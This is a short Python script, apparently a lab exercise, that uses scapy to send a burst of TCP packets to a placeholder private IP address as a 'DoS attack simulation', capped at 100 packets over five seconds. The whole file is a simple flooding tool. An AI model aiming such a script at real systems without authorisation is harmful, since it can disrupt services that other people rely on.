"""
DoS Flooder Attack Simulation
Maurizio Gonzalez
Date: 3/16/2025

Sends a burst of TCP packets to a target IP to simulate a DoS attack.
"""

import sys
import time
from scapy.all import Ether, IP, TCP, sendp

# Target configuration
TARGET_IP = "192.168.xxx.xxx"
INTERFACE = "enter interface type"
NUM_PACKETS = 100
DURATION = 5

# Sends TCP packets at a high rate
def send_packets(target_ip, interface, num_packets, duration):
    packet = Ether() / IP(dst=target_ip) / TCP()
    end_time = time.time() + duration
    packet_count = 0

    while time.time() < end_time and packet_count < num_packets:
        sendp(packet, iface=interface)
        packet_count += 1

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("This script requires Python 3.")
        sys.exit(1)

    send_packets(TARGET_IP, INTERFACE, NUM_PACKETS, DURATION)
